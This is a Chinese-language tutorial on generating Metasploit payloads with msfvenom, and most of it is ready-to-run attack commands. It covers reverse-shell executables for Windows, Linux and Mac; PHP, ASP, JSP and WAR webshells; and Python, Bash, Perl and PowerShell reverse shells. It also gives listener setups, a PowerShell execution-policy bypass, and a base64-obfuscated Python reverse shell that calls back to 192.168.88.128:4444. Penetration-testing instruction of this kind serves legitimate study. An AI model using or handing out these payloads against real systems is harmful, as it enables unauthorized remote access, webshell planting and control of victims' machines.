## 生成适用于`msf`的`payload`以及利用

主要记录一下常用的`payload`以及如何使用。

生成`payload`使用的工具是`MSFVenom`

在`kali`下可以使用如下命令列出`MSFVenom`可以生成的`payload`列表：

`msfvenom -l`



-----
生成二进制文件
关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。


```
Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

如何利用
针对这个部分就以`Windows`为例，使用上面的命令生成一个`exe`的`payload`

命令如下：

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f exe > shell.exe`

 
-----

 
复制`shell.exe`到`Windows`机器，然后`kali`下开启`msf`使用如下命令监听`4444`端口：

```
msfconsole

use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.88.128

set LPORT 4444

set ExitOnSession false

exploit -j -z
```
 
执行完之后在Windows下执行`shell.exe`，然后等结果

-----
 
在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：

双击运行
cmd下运行exe
利用Powershell远程下载执行
利用at或schtasks设置计划任务执行
利用wmic远程命令执行
其他的方式请各位补充
生成webshell脚本
在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，如何使用MSFVenom生成一个可以用msf操作的webshell呢？

- PHP
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`

`cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

 
- ASP

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`

- JSP
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`

- WAR
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`

------
## 利用

下面以php为例做一下测试，使用以下命令生成一个webshell：

`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f raw > shell.php`

 
在kali上使用msf执行下面的命令，监听端口4444：
```
msfconsole

use exploit/multi/handler

set PAYLOAD php/meterpreter_reverse_tcp

set LHOST 192.168.88.128

set LPORT 4444

set ExitOnSession false

exploit -j -z

```
将`shell.php` 放在`web`目录下，使用 **浏览器访问**，或者使用以下命令执行：

`php shell.php`

------- 

## 脚本`shell`

关于使用脚本反弹`shell`的方式，主要以`python`、`bash`、`perl`为例。

- Python
`msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`

- Bash
`msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`

- Perl
`msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`

- Powershell
`msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f psh > shell.ps1`

`powershell.exe -ExecutionPolicy Bypass -File shell.ps1`

----
## 使用
下面就以Python为例做一下测试，使用以下命令生成一个脚本：

`msfvenom -p cmd/unix/reverse_python LHOST=192.168.88.128 LPORT=4444 -f raw > shell.py`

 
在kali上使用msf执行下面的命令，监听端口4444：

```
msfconsole

use exploit/multi/handler

set PAYLOAD cmd/unix/reverse_python

set LHOST 192.168.88.128

set LPORT 4444

set ExitOnSession false

exploit -j -z
```
 
然后复制`shell.py`中的内容在linux命令行下执行，如下：
```
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"
```
 



## 总结
`msfvenom`生成常用的反向连接的`shell`，`msfvenom`可以生成的`shell`很多